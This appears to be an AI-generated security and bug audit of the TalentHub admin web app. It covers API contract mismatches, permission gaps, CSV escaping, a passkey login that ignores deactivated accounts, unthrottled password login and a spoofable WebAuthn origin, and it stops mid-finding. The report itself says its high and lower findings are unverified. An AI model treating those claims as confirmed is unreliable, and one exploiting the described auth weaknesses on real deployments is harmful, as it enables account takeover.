# TalentHub — Admin Side Bug Audit

**Coverage:** complete — all 19 admin pages plus the shared admin shell.
**Findings:** 263 unique — 14 critical, 46 high, 125 medium, 78 low.

> The adversarial-verification pass never completed for any group (session token limits). Every CRITICAL was manually re-verified against source, and one was demoted after verification. **Everything at HIGH and below is unverified** — confirm before acting.

---

# Shared shell & API layer — 15 findings

## [HIGH] featureTipAdminApi calls /api/admin/feature-tips endpoints that do not exist anywhere in the backend
`frontend/src/api/adminApi.js:976` · *api-contract-mismatch*

**What's wrong:** featureTipAdminApi (adminApi.js:974-1020) calls GET/POST /admin/feature-tips, PATCH /admin/feature-tips/:id/toggle and DELETE /admin/feature-tips/:id. I grepped every file under backend/routes: adminRoutes.js (read in full) declares no feature-tips route, and the only file that references the controller is backend/routes/featureTipRoutes.js — which is never required or mounted in app.js (grep for "featureTipRoutes" across backend/ matches only its own header comment). So all four admin endpoints 404, and the intern endpoints /api/feature-tips/unseen and /api/feature-tips/mark-seen are unreachable too. AppRoutes.jsx:167 still routes /admin/feature-tips to the AdminFeatureTips page.

**Failure:** An admin navigates to /admin/feature-tips. The list request falls through adminRoutes (auth + requireAdmin pass, no route matches), through adminSeatRoutes, and hits Express's default 404 handler, which returns HTML. res.ok is false so adminApi.js:981 throws "Failed to fetch feature tips: 404". The page shows an error and stays empty; creating, toggling or deleting a tip fails identically. On the intern side FeatureTipModal.jsx:15 calls api.get("/feature-tips/unseen"), gets the HTML 404, res.json() throws a SyntaxError that is swallowed at line 20-22, so feature tips silently never appear for any intern.

**Evidence:**
```
adminApi.js:976 `const res = await fetch(`${API_BASE_URL}/admin/feature-tips`, {`. backend/routes/featureTipRoutes.js exists (exports /unseen and /mark-seen only) but backend/app.js lines 7-27 never require it and lines 61-85 never mount it. adminRoutes.js contains no "feature-tips" string.
```

**Fix:** Add `app.use("/api/feature-tips", featureTipRoutes)` in app.js and register the four admin handlers (getAllFeatureTips/createFeatureTip/toggleFeatureTip/deleteFeatureTip from featureTipController.js) on adminRoutes.js under /feature-tips with an explicit requirePermission, since routePermission() would otherwise default them to dashboard.view.

## [HIGH] api.get/post/put/patch/delete never check response.ok — error bodies are returned to callers as data
`frontend/src/utils/api.js:90` · *error-handling*

**What's wrong:** All five helpers in the shared `api` object (utils/api.js:84-131) run `await checkAuth(res)` — which only reacts to status 401 — and then unconditionally `return res.json()`. Any 403, 404, 409 or 500 is parsed and handed back to the caller as though it were a successful payload. When the backend returns JSON the caller receives `{ message, code }` and treats it as the result; when Express returns its default HTML 404 page, res.json() throws an opaque SyntaxError that callers attribute to a network problem.

**Failure:** Verified live case: FeatureTipModal.jsx:15 does `const res = await api.get("/feature-tips/unseen")`. That route is never mounted (app.js has no featureTipRoutes mount), so Express returns an HTML 404; res.json() throws "Unexpected token '<'", the catch at FeatureTipModal.jsx:20-22 logs it, and the modal silently never opens — no user or developer sees that the endpoint is missing. The JSON variant is just as bad: a 403 from requirePermission returns `{message:"Permission required: x", code:"FORBIDDEN"}`, `res.length` is undefined, the `res.length > 0` guard is false, and the UI shows a normal empty state instead of an access error.

**Evidence:**
```
utils/api.js:85-91 `get: async (endpoint) => { const res = await fetch(...); await checkAuth(res); return res.json(); }` — checkAuth (line 44) returns early for anything that is not status 401. Contrast apiFetch (line 68-82), which at least returns the raw Response so callers can inspect res.ok.
```

**Fix:** In each of the five helpers, after checkAuth add `if (!res.ok) { const body = await res.json().catch(() => ({})); throw new Error(body.message || `Request failed: ${res.status}`); }` before parsing.

## [MEDIUM] adminSeatApi never handles 401 / never calls handleUnauthorized, so an expired admin session leaves the seat page permanently erroring
`frontend/src/api/adminSeatApi.js:88` · *error-handling*

**What's wrong:** sessionUtils.js:6-7 documents that "All API files (api.js, adminApi.js, adminSeatApi.js, leaveRequestApi.js) call handleUnauthorized() whenever they receive a 401", but adminSeatApi.js never imports sessionUtils. Every function instead conflates 401 and 403 into a thrown Error string (lines 88-93, 127-132, 159-167, 279-284) or ignores status entirely (lines 191-193, 221-223, 250-252). The stale adminInfo is never cleared and the user is never redirected to /admin-login.

**Failure:** An admin leaves /admin/seat-management open past the 24h JWT expiry (authService.js:20). The page's polling refresh calls getSeatBookings; authMiddleware returns 401 TOKEN_EXPIRED; adminSeatApi throws "Authentication failed. Please login again." The page shows that error, keeps polling, and keeps failing — but adminInfo is still in localStorage so AdminRoute still considers the session valid and nothing navigates. The admin must manually clear storage or guess to visit /admin-login, whereas every other admin page (via adminApi.js:17) auto-redirects with a session-expired banner.

**Evidence:**
```
adminSeatApi.js:88-93 `if (!response.ok) { if (response.status === 401 || response.status === 403) { throw new Error("Authentication failed. Please login again."); } ... }` — no import of handleUnauthorized anywhere in the file (line 1 imports only API_BASE_URL).
```

**Fix:** Import handleUnauthorized from ../utils/sessionUtils and add the same `checkAuth(response)` helper adminApi.js:4-20 uses, calling it right after every fetch in adminSeatApi.

## [MEDIUM] Announcements button in AdminNavbar is rendered without any permission check while the backend requires announcements.manage
`frontend/src/components/AdminNavbar.jsx:73` · *permissions-auth*

**What's wrong:** Both the mobile (line 34) and desktop (line 73) megaphone buttons are rendered unconditionally — AdminNavbar imports nothing from utils/adminAuth and receives no permission data. handleAnnouncementsToggle (line 10-16) navigates to /admin/announcements, which AppRoutes.jsx:166 renders inside AdminRoute (no permission gate). The backend maps /announcements to "announcements.manage" (adminAuth.js:32), which supervisors do not have (adminPermissions.js:12-15). Every other nav entry is permission-filtered at AdminNavigation.jsx:59; this button is the one hole.

**Failure:** A supervisor logs in, sees the megaphone in the top bar, and clicks it. AdminAnnouncements mounts, its token check at line 137-138 passes, fetchAnnouncements 403s and the catch at line 129-130 sets "Failed to load announcements." The compose form (title, message, priority, Send) is still fully rendered and enabled; clicking Send calls announcementApi.create, gets 403, and shows the raw "Failed to create announcement: 403" toast. The supervisor cannot tell whether the feature is broken or forbidden.

**Evidence:**
```
AdminNavbar.jsx:73-79 `<button onClick={handleAnnouncementsToggle} className={...} aria-label="Toggle Announcements">` with no surrounding condition; AdminNavbar.jsx:1-4 imports no auth helper. adminAuth.js:32 `if (path.startsWith("/announcements")) return "announcements.manage";`
```

**Fix:** Wrap both megaphone buttons in `hasAdminPermission("announcements.manage") && (...)`, importing the helper from ../utils/adminAuth as AdminNavigation already does.

## [MEDIUM] AppRoutes has no catch-all route — any unmatched URL renders a blank white page with no navigation
`frontend/src/routes/AppRoutes.jsx:200` · *routing*

**What's wrong:** The <Routes> block (lines 42-200) declares 40 paths and closes with no `<Route path="*" .../>`. React Router renders nothing when no path matches, and because AdminNavigation is rendered inside each page component rather than as a layout route, an unmatched admin URL produces a completely empty document — no sidebar, no top bar, no error message, no link back.

**Failure:** An admin follows a stale bookmark or mistypes, e.g. /admin/daily-record (singular) or /admin/seat-managment. The app renders a blank white page. There is no sidebar or header to click, so the only recovery is editing the address bar. The same happens after any future route rename, and it makes typos indistinguishable from an app crash during support calls.

**Evidence:**
```
AppRoutes.jsx:198-200: `<Route path="/admin/users" element={<AdminUserManagement />} />` then `</Route>` then `</Routes>` — no wildcard route in the file.
```

**Fix:** Add `<Route path="*" element={<NotFound />} />` as the last child of <Routes>, rendering a 404 page that links to /admin/dashboard for admin sessions and / otherwise.

## [MEDIUM] Attendance nav item is gated on attendance.view but the page's write actions require attendance.manage
`frontend/src/components/AdminNavigation.jsx:48` · *permissions-auth*

**What's wrong:** AdminNavigation.jsx:48 declares permission "attendance.view" for /admin/intern-attendance, so supervisors (who hold attendance.view per adminPermissions.js:13) see the link. But adminAuth.js:33-35 returns "attendance.view" only for GET; every non-GET under /attendance resolves to "attendance.manage". The Attendance page issues POST /admin/attendance/trigger-report (Admininternattendance.jsx:93) and PUT /admin/attendance/settings (Admininternattendance.jsx:131), both of which therefore demand attendance.manage, and the page renders those controls unconditionally because AdminRoute does no per-route permission check.

**Failure:** A supervisor opens Attendance from the sidebar. The date grid and exports load fine (all GETs). They then click "Trigger Report" to send the weekly non-attendance email, or change an attendance setting and save. The request 403s with `{message:"Permission required: attendance.manage"}`; the button gives no indication it was never usable. The supervisor retries, then files a bug report about a broken email trigger.

**Evidence:**
```
AdminNavigation.jsx:48 `{ to: "/admin/intern-attendance", label: "Attendance", ..., permission: "attendance.view" }`. adminAuth.js:33-35 `if (path.startsWith("/attendance") ...) { return req.method === "GET" ? "attendance.view" : "attendance.manage"; }`. Admininternattendance.jsx:93 `fetch(`${API_BASE_URL}/admin/attendance/trigger-report`, {` (POST).
```

**Fix:** Keep the nav gate at attendance.view for read access, but wrap the trigger-report and settings-save controls on the Attendance page in `hasAdminPermission("attendance.manage")` so a supervisor never sees a control the server will reject.

## [MEDIUM] CSV exports quote fields without doubling embedded quotes, corrupting rows for any name/institute containing a quote character
`frontend/src/api/adminApi.js:609` · *file-export*

**What's wrong:** Every converter in csvUtils wraps free-text values in double quotes but never escapes quotes already inside the value: adminApi.js:609 and 611 (convertToCSV), 679/682/683 (within-week), 777-784 (overdue), 839-847 (weekly). Per RFC 4180 an embedded `"` must be written as `""`. The one place the codebase gets it right is adminSeatApi.js:399 (`.replace(/"/g, '""')`), which confirms the intent. Several fields are also emitted with no quoting at all (adminApi.js:608 traineeId, 610 email, 618 totalRecords), so a comma anywhere in those values splits a column.

**Failure:** An intern record has fieldOfSpecialization stored as `Software Engineering ("AI/ML")` — a value an admin can enter through the sync/import path. An admin exports the overdue-interns CSV from the dashboard. The row becomes `...,"Software Engineering ("AI/ML")",...`; Excel terminates the field at the second quote, so "AI/ML")" is parsed as a new column and every remaining column on that row (Institute, Start Date, End Date, Total Records, Last Submission, Days Since) shifts one place right. That single intern's dates land under the wrong headers while the rest of the sheet looks fine — silent, hard-to-spot bad data.

**Evidence:**
```
adminApi.js:607-613 `return [ intern.traineeId || "", `"${intern.traineeName || ""}"`, intern.email || "", `"${intern.fieldOfSpecialization || ""}"`, ...` — no .replace on any of them.
```

**Fix:** Add a single `const csvCell = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`` helper in adminApi.js and route every emitted field in all four converters through it.

## [MEDIUM] Approved-leave report defaults to the UTC date, producing yesterday's report before 5:30 AM Sri Lanka time
`frontend/src/api/adminApi.js:66` · *date-timezone*

**What's wrong:** downloadApprovedLeaveReport falls back to `new Date().toISOString().split("T")[0]` when no date argument is supplied. toISOString() converts to UTC, but the value is used as a local calendar date by the backend query. Sri Lanka is UTC+5:30, so between 00:00 and 05:29 local time the UTC date is still the previous day. The same pattern appears at adminApi.js:874 for the export filename and ExportModal.jsx:19 for the default single-day export date.

**Failure:** An early-shift admin opens the leave dashboard at 05:00 on 5 August (Asia/Colombo) and clicks Download Approved Leave Report without picking a date. `new Date().toISOString()` is "2026-08-04T23:30:00.000Z", so the request goes out as ?date=2026-08-04. The admin receives 4 August's approved short leaves and hands the gate staff a pass list for the wrong day; today's approvals are missing entirely, with nothing in the UI indicating which date was used.

**Evidence:**
```
adminApi.js:64-67 `} else { // Default to today if no date parameters provided\n params.set("date", new Date().toISOString().split("T")[0]); }`
```

**Fix:** Use a local-date formatter, e.g. `const d = new Date(); const local = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`` (the same construction already used correctly in formatDateForExport at adminApi.js:548-551), and apply it at line 66, line 874 and ExportModal.jsx:19.

## [MEDIUM] ExportModal's template fallback only fires on thrown errors, so an HTTP error leaves the dropdown empty with no message
`frontend/src/components/ExportModal.jsx:55` · *error-handling*

**What's wrong:** fetchTemplates guards the success path with `if (res.ok)` (line 55) but supplies no else branch. The hard-coded fallback list lives only in the catch block (lines 63-71), which fetch does not reach for HTTP error statuses — fetch resolves normally on 401/403/404/500. The finally block clears loadingTemplates regardless, so the modal presents itself as ready. There is also no handleUnauthorized call, unlike every other API path in the app.

**Failure:** An intern's token has expired and they open the export modal on /DailyRecords. GET /api/records/export/templates returns 401 (dailyRecordRoutes.js:27 applies authenticateUser). res.ok is false, nothing is set, templates stays []. The spinner disappears, the dropdown button reads "Select a template" (selectedTemplate is undefined at line 114/159), opening it shows "No templates found", and the Export button is fully enabled because isValid() is true and loadingTemplates is false. Clicking Export fires the real export with templateId still "default" and fails again — the user never learns their session expired and never sees the fallback template list that exists for exactly this situation.

**Evidence:**
```
ExportModal.jsx:55-62 `if (res.ok) { const data = await res.json(); setTemplates(data); ... }` followed directly by `} catch (err) { ... setTemplates([...fallback]) }` at lines 63-71 — no `else` and no status inspection.
```

**Fix:** Change to `if (!res.ok) throw new Error(`templates ${res.status}`)` so the existing fallback path runs, and call handleUnauthorized(...) from utils/sessionUtils when res.status === 401.

## [MEDIUM] Admin logout removes only adminInfo, leaving intern session keys behind on shared machines
`frontend/src/components/AdminNavigation.jsx:67` · *permissions-auth*

**What's wrong:** handleLogout (lines 66-69) calls localStorage.removeItem("adminInfo") and navigates away. The app's own canonical teardown, handleUnauthorized in sessionUtils.js:22-27, clears six keys: adminInfo, authToken, internId, gateStaffInfo, token and userData. The logout button clears one, so any intern or gate-staff session established earlier in the same browser survives the admin "logout".

**Failure:** On a shared front-desk workstation an intern signs in (Login.jsx:88-89 writes internId and authToken), then an admin signs in and later clicks Logout in the sidebar. adminInfo is gone, but internId and authToken remain. The next person to browse to /dashboard is admitted straight into the previous intern's account: AgreementGuard.jsx:14 reads internId from localStorage and loads that intern's profile, and utils/api.js:9-10 attaches the leftover authToken to every request. The admin believes they logged the machine out.

**Evidence:**
```
AdminNavigation.jsx:66-69 `const handleLogout = () => { localStorage.removeItem("adminInfo"); navigate("/admin-login"); };` versus sessionUtils.js:22-27 which removes six keys.
```

**Fix:** Replace the body of handleLogout with the same key list used by handleUnauthorized (or export a shared `clearSession()` from sessionUtils and call it from both places).

## [MEDIUM] downloadInternReport's within-week branch can never be selected, and its converter emits unquoted comma-bearing dates
`frontend/src/api/adminApi.js:863` · *logic-error*

**What's wrong:** downloadInternReport picks the converter with `reportType.startsWith("weekly_non_submissions_within_week")` (line 863), but the only caller of the within-week export, AdminDashboard.jsx:294-297, passes `weekly_non_submissions_from_${startDateStr}` — which does not start with that prefix. It therefore falls to line 868 and uses convertWeeklyNonSubmissionsToCSV. convertWeeklyNonSubmissionsWithinWeekToCSV (lines 639-699) is dead code, and it is dead code that would break if wired up: unlike its sibling it emits formatDateShort output unquoted at lines 684-689 and 691-693, and formatDateShort (line 560-564) returns "Aug 05, 2026" — a value containing a comma.

**Failure:** Today the within-week export silently uses the wrong (fortunately compatible) converter, so the dedicated 10-column layout that was written to mirror the emailed Excel report is never exercised. The moment anyone corrects the reportType string to match line 863 — the obvious fix when the layouts are later made to differ — every row gains three extra columns, because "Training Start Date", "Training End Date" and "Last Submission Date" each split at the comma in "Aug 05, 2026", pushing "Logs Submitted" and the trailing columns out of alignment for all rows.

**Evidence:**
```
adminApi.js:863 `if (reportType.startsWith("weekly_non_submissions_within_week")) {` vs AdminDashboard.jsx:296 `` `weekly_non_submissions_from_${startDateStr}` ``. adminApi.js:684-689 `intern.trainingStartDate ? formatDateShort(intern.trainingStartDate) : "Not Set",` (bare, not quoted) vs the quoted equivalents at lines 844-845.
```

**Fix:** Either delete convertWeeklyNonSubmissionsWithinWeekToCSV and its branch, or fix AdminDashboard.jsx:296 to pass a `weekly_non_submissions_within_week_...` reportType — and in either case quote the date/logs fields at adminApi.js:684-693.

## [LOW] getAuthToken parses localStorage JSON without try/catch in both admin API modules
`frontend/src/api/adminApi.js:27` · *crash*

**What's wrong:** adminApi.js:27 and 33, and the identical adminSeatApi.js:7 and 13, call JSON.parse on the raw localStorage values for "adminInfo" and "userData" with no guard. Every other reader in the codebase is hardened — adminAuth.js:2-3 wraps it in try/catch and returns null, utils/api.js:15-20 catches and logs, and the page-level readers use the `|| "{}"` default. A SyntaxError here is thrown synchronously from getHeaders(), so it escapes as a rejected promise from the functions that wrap their body in try/catch, and as an uncaught synchronous throw from getFaceEnrollmentProfiles (adminApi.js:518-537), which has no try/catch at all.

**Failure:** The adminInfo entry is left non-parseable — a truncated write when the storage quota was hit, or the literal string "undefined" written by another script/extension. getAdminSession() catches and returns null so AdminRoute bounces the user to /admin-login, but any component that calls an adminApi helper before that redirect commits (or any adminSeatApi call, since getSeatBookings is fired from a polling interval) throws "Unexpected token u in JSON at position 0" instead of the clean "session invalid" flow, surfacing a raw parser error to the user.

**Evidence:**
```
adminApi.js:25-29 `const adminInfo = localStorage.getItem("adminInfo"); if (adminInfo) { const parsed = JSON.parse(adminInfo); return parsed.token; }` — compare adminAuth.js:2-3 `try { return JSON.parse(localStorage.getItem("adminInfo") || "null"); } catch { return null; }`.
```

**Fix:** Have both modules import and reuse getAdminSession() from utils/adminAuth (`return getAdminSession()?.token ?? null`) instead of re-implementing an unguarded parse.

## [LOW] API_BASE_URL has no fallback or validation, so a missing env var silently produces relative URLs
`frontend/src/api/apiConfig.js:2` · *configuration*

**What's wrong:** apiConfig.js:2 and utils/api.js:4 both assign `import.meta.env.VITE_BACKEND_URL` directly with no default and no assertion. Vite substitutes `undefined` at build time when the variable is absent, so every template literal such as `${API_BASE_URL}/admin/dashboard/stats` becomes the relative path "undefined/admin/dashboard/stats", which the browser resolves against the app's own origin.

**Failure:** A developer clones the repo without a .env, or a CI build forgets to inject VITE_BACKEND_URL. The app compiles and runs. Every admin page loads its shell and then reports a generic failure — "Failed to fetch dashboard stats: 404", "Failed to load announcements." — because requests hit the static dev/CDN server and get HTML 404s. Nothing anywhere names the missing environment variable, so the symptom looks like a broken backend rather than a config gap.

**Evidence:**
```
apiConfig.js:1-2 `// API Configuration\nexport const API_BASE_URL = import.meta.env.VITE_BACKEND_URL;` and utils/api.js:4, identical.
```

**Fix:** `export const API_BASE_URL = import.meta.env.VITE_BACKEND_URL || "/api";` plus a `if (!import.meta.env.VITE_BACKEND_URL) console.error("VITE_BACKEND_URL is not set")` at module load, and have utils/api.js re-export from apiConfig instead of duplicating the read.

## [LOW] Header title falls back to "Dashboard" on every page that is not a top-level nav link
`frontend/src/components/AdminNavigation.jsx:64` · *logic-error*

**What's wrong:** activeTitle is derived by looking up location.pathname in navLinks (line 63) with a single special case for /admin/announcements, otherwise defaulting to the literal "Dashboard" (line 64). navLinks contains only the 12 sidebar destinations and is additionally filtered by permission at line 59, so any other admin route — and any route whose link the current user's permissions hid — renders the wrong title in AdminNavbar's desktop header (AdminNavbar.jsx:69).

**Failure:** An admin clicks an intern from the daily-records table and lands on /admin/intern/68f2.../records. The sidebar shows no active item and the blue header bar reads "Dashboard" while the page body shows that intern's logbook. The same wrong title appears on /admin/manual-attendance, /admin/intern/:id/certificate, /admin/users and the legacy /admin-dashboard path, making the header useless as a location indicator.

**Evidence:**
```
AdminNavigation.jsx:63-64 `const activeLink = navLinks.find(link => isActive(link.to));\nconst activeTitle = activeLink ? activeLink.label : (isActive("/admin/announcements") ? "Announcements" : "Dashboard");`
```

**Fix:** Match with startsWith against an unfiltered route→title table that includes the detail routes (/admin/intern/:id, /admin/manual-attendance, /admin/users, /admin/feature-tips), and fall back to "" rather than "Dashboard" when nothing matches.

## [LOW] Face ID and PIN nav items demand attendance.manage while their read endpoints only require attendance.view
`frontend/src/components/AdminNavigation.jsx:49` · *permissions-auth*

**What's wrong:** AdminNavigation.jsx:49 (Face ID) and :51 (PIN) declare permission "attendance.manage". The backend's routePermission (adminAuth.js:33-35) returns "attendance.view" for every GET under /face-attendance, which covers GET /admin/face-attendance/meeting-pin (adminRoutes.js:207) and GET /admin/face-attendance/profiles (adminRoutes.js:210) — the read paths adminApi.getFaceMeetingPin (line 457) and getFaceEnrollmentProfiles (line 520) use. This is a hidden-but-allowed mismatch: the sidebar is stricter than the server.

**Failure:** A supervisor holds attendance.view and is therefore trusted by the backend to read the enrolment roster and the current meeting PIN, but the sidebar hides both entries so they cannot get there. Meanwhile the same supervisor CAN reach both pages by typing the URL (AdminRoute does no permission check), where the reads succeed and only the write actions 403 — an inconsistent, arbitrary-looking access model that will send supervisors to an admin to read data they are already authorised to see.

**Evidence:**
```
AdminNavigation.jsx:49 `{ to: "/admin/face-attendance", label: "Face ID", ..., permission: "attendance.manage" }` vs adminAuth.js:33-35 `if (path.startsWith("/attendance") || path.startsWith("/face-attendance") ...) { return req.method === "GET" ? "attendance.view" : "attendance.manage"; }`
```

**Fix:** Decide one contract per page: either set these nav entries' permission to "attendance.view" and gate the individual enrol/scan/stop-PIN controls on attendance.manage, or tighten the backend GET handlers for /face-attendance/* to requirePermission("attendance.manage").

# AdminLogin — 14 findings

## [CRITICAL] Google-invited admins/supervisors have no way to log in — AdminLogin offers only password + passkey
`frontend/src/pages/AdminLogin.jsx:595` · *feature-broken*

**What's wrong:** AdminLogin.jsx exposes exactly two auth methods: the password form (line 595, POST /auth/login) and "SIGN IN WITH PASSKEY" (line 699). There is no Google sign-in button anywhere on the page. But the admin invitation flow creates accounts with `authProvider: "google"` and NO password (adminUserController.js:53-64), and the invitation email tells the invitee to open /admin-login and "Select Continue with Google" (adminInvitationEmailService.js:52,65). `authService.login` line 55 does `if (!user || !user.password) return { error: "Invalid email or password" }`, so the password form rejects them. They also cannot register a passkey because /auth/webauthn/generate-registration-options requires an existing admin JWT (webauthnRoutes.js:8). The endpoint that would work, `/auth/admin-google-login`, exists on the backend (authRoutes.js:20) and is declared in apiConfig.js:10 as ADMIN_GOOGLE_LOGIN, but grepping the whole of frontend/src shows it is never called from any component — the only <GoogleLogin> in the app is in Login.jsx (the intern page), which posts to /auth/google-login.

**Failure:** A super_admin invites jane@slt.lk as a supervisor via AdminUserManagement. Jane receives the email saying "Sign in with Google using jane@slt.lk" with a link to /admin-login. She opens the page, sees only an email/password form and a passkey button. Typing her email with any password returns "Invalid email or password". She is permanently locked out; the entire user-invitation feature produces unusable accounts.

**Evidence:**
```
AdminLogin.jsx:595 <form onSubmit={handleSubmit}> — only email/password inputs and the passkey button (line 699); no GoogleLogin component in the file. adminUserController.js:53-64 User.create({...authProvider:"google"}) with no password. authService.js:55 `if (!user || !user.password) return { error: "Invalid email or password" };`. Grep for ADMIN_GOOGLE_LOGIN|admin-google-login across frontend/src returns only apiConfig.js:10.
```

**Fix:** Add a <GoogleLogin> button to AdminLogin.jsx that posts the credential to `${API_BASE_URL}${API_ENDPOINTS.AUTH.ADMIN_GOOGLE_LOGIN}` and stores the returned {token,user} into adminInfo the same way handleSubmit does, then navigates.

## [CRITICAL] Passkey login bypasses the isActive check — deactivated admins get a valid 24h admin JWT
`backend/controllers/webauthnController.js:222` · *auth-bypass*

**What's wrong:** `verifyAuthentication` finds the user by credential ID and, on a successful assertion, calls `authService.createAdminSession(user)` (line 227) with no check of `user.isActive`. The password path explicitly blocks this at authService.js:62 (`if (!user.isActive) return { error: "Account is inactive..." }`). The issued token carries `accountType: "admin"`, role and full permissions for 24h (authService.js:17-21). `requireAdmin` re-checks isActive, but many admin-reachable routes mount only `authenticateUser` — e.g. internRoutes.js:117 `router.get("/", authenticateUser, getAllInterns)` and internRoutes.js:121 `router.delete("/:id", authenticateUser, removeIntern)` — so the token is fully usable against them.

**Failure:** A super_admin deactivates a former admin's account (isActive=false) after they leave. That person had already registered a passkey. They open /admin-login, click "SIGN IN WITH PASSKEY" (AdminLogin.jsx:281), touch their fingerprint sensor, and receive a fresh 24h admin JWT. They can then call DELETE /api/interns/:id (internRoutes.js:121, authenticateUser only) and delete intern records.

**Evidence:**
```
webauthnController.js:222-228 — `if (verified) { passkey.counter = ...; user.lastLoginAt = new Date(); await user.save(); const session = authService.createAdminSession(user); return res.json({ verified: true, ...session }); }` with no isActive/role guard, versus authService.js:62 `if (!user.isActive) return { error: "Account is inactive. Please contact a super admin." };`
```

**Fix:** In verifyAuthentication, immediately after resolving `user` (webauthnController.js:199), add `if (!user.isActive) return res.status(403).json({ error: "Account is inactive. Please contact a super admin." });` and reject roles outside super_admin/admin/supervisor.

## [HIGH] No rate limiting on the admin password login endpoint — unlimited brute force
`backend/app.js:58` · *security*

**What's wrong:** AdminLogin.jsx:194 posts credentials to `/api/auth/login` (authRoutes.js:23 -> authController.login -> authService.login). The global rate limiter is commented out in app.js lines 50-58 even though `express-rate-limit` is an installed dependency, and neither authRoutes.js nor the controller applies any per-route throttling or account lockout. `authService.login` performs a bcrypt compare and returns "Invalid email or password" with no attempt counter. Combined with `app.use(cors({ origin: "*" }))` at app.js:40, the endpoint is callable from any origin without limit.

**Failure:** An attacker who knows the super-admin email (SUPER_ADMIN_EMAIL defaults to superadmin@slt.lk in authService.js:50) scripts POST /api/auth/login from any browser or curl with a password list. Nothing throttles, locks, or logs the attempts, so the admin portal password can be brute forced offline-speed-limited only by bcrypt cost.

**Evidence:**
```
app.js:50-58 — the entire `apiLimiter` block and `app.use(apiLimiter)` are commented out; app.js:5 `// const rateLimit = require("express-rate-limit");`. authRoutes.js:23 `router.post("/login", login);` with no middleware.
```

**Fix:** Re-enable express-rate-limit and mount a stricter limiter specifically on /api/auth/login, /api/auth/gate-staff-login and /api/auth/webauthn/generate-authentication-options (e.g. 10 attempts per 15 min per IP), plus a per-account failed-attempt counter.

## [HIGH] Concurrent 401s land the admin on the intern login page instead of /admin-login
`frontend/src/utils/sessionUtils.js:18` · *race-condition*

**What's wrong:** `handleUnauthorized` determines the redirect target by re-reading localStorage: `const wasAdmin = !!localStorage.getItem("adminInfo")` (line 18), then removes adminInfo (line 22), then branches to /admin-login (line 37) or /gate-staff-login or `/` (line 39). It is invoked synchronously from each 401 response handler — adminApi.js:17 and utils/api.js:61 — with no guard against re-entry. `window.location.replace()` only schedules a navigation; the remaining in-flight promise handlers still run in the same task. The second handler sees adminInfo already removed, so `wasAdmin` and `wasGateStaff` are both false and it calls `window.location.replace("/")`, which supersedes the earlier one.

**Failure:** An admin's 24h token expires while AdminDashboard is open. The dashboard fires several parallel requests through adminApi; all return 401. The first handler clears adminInfo and queues replace("/admin-login"); the second and third handlers see no adminInfo and queue replace("/"). The admin ends up on the INTERN login page (Login.jsx) with a "session expired" banner, unable to find the admin login form.

**Evidence:**
```
sessionUtils.js:18 `const wasAdmin = !!localStorage.getItem("adminInfo");` / line 22 `localStorage.removeItem("adminInfo");` / lines 34-40 the wasGateStaff/wasAdmin/else branch. adminApi.js:4-19 `checkAuth` calls `handleUnauthorized(msg)` on every 401 with no dedupe; utils/api.js:45-64 does the same.
```

**Fix:** Capture the role before clearing and guard against re-entry, e.g. a module-level `let redirecting = false; if (redirecting) return; redirecting = true;` at the top of handleUnauthorized.

## [MEDIUM] Redirect-after-login is dead — AdminRoute passes location.state.from but AdminLogin never reads it
`frontend/src/pages/AdminLogin.jsx:166` · *logic*

**What's wrong:** AdminRoute.jsx:8 redirects unauthenticated users with `<Navigate to="/admin-login" replace state={{ from: location }} />`. AdminLogin.jsx imports only `useNavigate` (line 2) — never `useLocation` — and all three success paths hardcode `navigate("/admin/dashboard")`: the autofill passkey path (line 166), the skip/registration path (lines 256 and 278), and the manual passkey path (line 309). Grepping the whole frontend for `location.state` shows the only consumer is AdminInternRecords.jsx:319, which reads an unrelated `from === "daily-records"` value. The `from` state AdminRoute stores is therefore never used by anything.

**Failure:** An admin has a bookmark to /admin/intern-attendance. Their session has expired, so opening the bookmark hits AdminRoute, which redirects to /admin-login carrying state.from = /admin/intern-attendance. After logging in successfully they land on /admin/dashboard and must re-navigate to attendance manually. Same for every deep link emailed between admins.

**Evidence:**
```
AdminRoute.jsx:8 `return <Navigate to="/admin-login" replace state={{ from: location }} />;` vs AdminLogin.jsx:2 `import { useNavigate } from "react-router-dom";` and AdminLogin.jsx:166/256/278/309 all `navigate("/admin/dashboard")`.
```

**Fix:** Import useLocation in AdminLogin, compute `const dest = location.state?.from?.pathname || "/admin/dashboard"` once, and use `navigate(dest, { replace: true })` in all four success paths.

## [MEDIUM] WebAuthn expectedOrigin is taken from the attacker-controllable Origin request header
`backend/controllers/webauthnController.js:40` · *security*

**What's wrong:** `getExpectedOrigin = (req) => req.get('origin') || defaultOrigin` (line 40) is used as `expectedOrigin` for both verifyRegistrationResponse (line 89/97) and verifyAuthenticationResponse (line 203/209). WebAuthn's origin binding exists precisely so the server pins the origin it trusts; deriving it from the request header means the server accepts an assertion from whatever origin the caller claims. The only remaining protection is `expectedRPID: defaultRpID`, which permits any subdomain of the RP ID. With `app.use(cors({ origin: "*" }))` at app.js:40, cross-origin POSTs to these endpoints are unrestricted.

**Failure:** With RP_ID/ADMIN_PORTAL_URL host = talenthub.slt.lk, a page hosted on any subdomain (e.g. a compromised or takeover-able status.talenthub.slt.lk) can run navigator.credentials.get({rpId:'talenthub.slt.lk'}). The browser allows it because the RP ID is a registrable suffix of the caller. The assertion's clientData.origin is https://status.talenthub.slt.lk, and the server accepts it because it read that same value out of the Origin header. POST /api/auth/webauthn/verify-authentication then returns a full admin JWT to the attacker's page.

**Evidence:**
```
webauthnController.js:40 `const getExpectedOrigin = (req) => req.get('origin') || defaultOrigin;` used at line 89 (`const expectedOrigin = getExpectedOrigin(req);`) and line 203, passed straight into verifyRegistrationResponse/verifyAuthenticationResponse as expectedOrigin.
```

**Fix:** Drop getExpectedOrigin and pass the server-derived `defaultOrigin` (or an explicit allowlist array of trusted origins) as expectedOrigin in both verify calls.

## [MEDIUM] Session expiry never validated client-side — expired adminInfo still passes AdminRoute
`frontend/src/components/AdminRoute.jsx:7` · *auth*

**What's wrong:** AdminRoute guards only on the presence of fields: `if (!session?.token || !session?.user?.role)`. Neither AdminRoute nor `getAdminSession` (adminAuth.js:1-4) checks whether the JWT has expired. AdminLogin writes a `loginTime` on every successful login (lines 163, 218, 306) and GateStaffLogin.jsx:64 does the same, but grepping frontend/src shows `loginTime` is never read anywhere. The token itself is minted with `expiresIn: "24h"` (authService.js:20) and its `exp` claim is never decoded on the client.

